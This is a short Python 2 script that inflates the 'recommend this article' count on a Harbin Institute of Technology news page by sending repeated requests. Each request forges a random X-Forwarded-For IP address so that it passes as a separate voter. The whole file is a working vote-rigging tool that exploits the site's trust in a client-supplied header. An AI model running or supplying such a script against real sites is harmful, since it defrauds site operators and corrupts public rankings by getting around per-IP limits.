# -*- coding: utf-8 -*-
"""
Created on Fri Dec 25 19:45:39 2015
@author: Tmn07
"""
import urllib2  
import random
import time 
# 传入'推荐本文'对应的url
target = '/commend/126309_1.htm'

base = 'http://today.hit.edu.cn'
url = base + target
user_agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36'  
headers = { 'User-Agent' : user_agent }  
def shua(k,headers):
    for i in range(k):
        a = random.randint(1,255)
        b = random.randint(0,255)
        c = random.randint(0,255)
        d = random.randint(0,255)
        ipAddress = "%d.%d.%d.%d" % (a,b,c,d)
        print ipAddress
    
        headers["X-Forwarded-For"] = ipAddress
        
        time.sleep(0.5)
        
        request = urllib2.Request(url, "", headers)  
        try:    
            urllib2.urlopen(request)
        except urllib2.HTTPError,e:
            print e.code
        
        print i

# 第一个参数为刷票次数.
shua(10,headers)